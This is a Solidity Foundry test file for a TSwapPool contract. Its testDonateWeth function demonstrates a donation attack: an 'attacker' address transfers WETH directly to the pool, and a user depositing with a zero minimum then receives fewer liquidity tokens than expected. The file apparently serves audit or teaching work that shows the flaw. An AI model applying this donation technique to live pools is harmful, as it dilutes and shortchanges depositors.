// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 1e64);
        poolToken.mint(attacker, 2000e18);
    }

    function testDonateWeth() public {
        // initial deposit
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(10e18, 10e18, 10e18, uint64(block.timestamp));

        vm.startPrank(attacker);
        weth.transfer(address(pool), 1);

        // user is trying to provide liquidity
        vm.startPrank(user);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        // user trusted the pool to calculate `liquidityTokensToMint` and passed `0`
        uint LPMinted = pool.deposit(100e18, 0, 100e18, uint64(block.timestamp));
        // without the donation user should have gotten 100e18
        // the larger the weth donation the less LP tokens the user will get
        assertLt(LPMinted, 100e18);
    }
}
